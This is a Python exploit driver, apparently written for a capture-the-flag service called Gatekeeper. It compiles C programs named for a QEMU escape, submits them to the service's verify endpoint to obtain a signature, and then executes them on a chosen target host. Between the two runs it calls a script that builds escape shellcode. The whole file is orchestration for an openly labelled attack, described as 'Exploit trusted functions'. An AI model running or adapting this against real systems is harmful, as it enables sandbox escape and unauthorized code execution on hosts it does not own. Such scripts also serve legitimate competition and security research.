#!/usr/bin/env python3

from __future__ import annotations

import argparse
import base64
import sys
import subprocess
import tempfile
from pathlib import Path

CHECKER_ROOT = Path(__file__).resolve().parents[1] / "checker"
MAKE_DIR = Path(__file__).resolve().parents[1] / "service" / "example_program"
print(CHECKER_ROOT)
if str(CHECKER_ROOT) not in sys.path:
    sys.path.insert(0, str(CHECKER_ROOT))

from proggen.compile import CompileError, make_compile  # type: ignore[import]
from service_client import GatekeeperClient  # type: ignore[import]


def build_and_read_b64(source_path: Path) -> str:
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        out_dir = tmp_path / "out"

        bin_path = make_compile(
            MAKE_DIR,
            source_path,
            out_dir,
            extra_cflags="-Os",
            target="prog",
            comptime_seed=1,
        )

        program_b64 = base64.b64encode(bin_path.read_bytes()).decode()

    return program_b64


def verify_and_execute(client: GatekeeperClient, source_path: Path):
    program_b64 = build_and_read_b64(source_path)

    verify_result = client.verify_program_sync(
        {"program": program_b64},
    )
    print("Verify result:", verify_result)

    execute_result = client.execute_program_sync(
        {"signature": verify_result["signature"], "program": program_b64}
    )
    decoded_result = base64.b64decode(execute_result.get("stdout", "")).decode()
    print(f"Execution result: {decoded_result}")


def main():
    with open("exploit.bin", "wb") as f:
        f.write(base64.b64decode(build_and_read_b64(Path("qemu-escape-main.c"))))

    parser = argparse.ArgumentParser(description="Exploit trusted functions")
    parser.add_argument(
        "--host",
        type=str,
        default="localhost",
        help="Target host to exploit",
    )
    args = parser.parse_args()
    client = GatekeeperClient(args.host)

    verify_and_execute(client, Path("qemu-escape-create-files.c"))

    subprocess.run(
        [str(Path(__file__).resolve().parents[0] / "build_qemu_escape_shellcode.sh")],
        check=True,
    )
    verify_and_execute(client, Path("qemu-escape-main.c"))


if __name__ == "__main__":
    main()
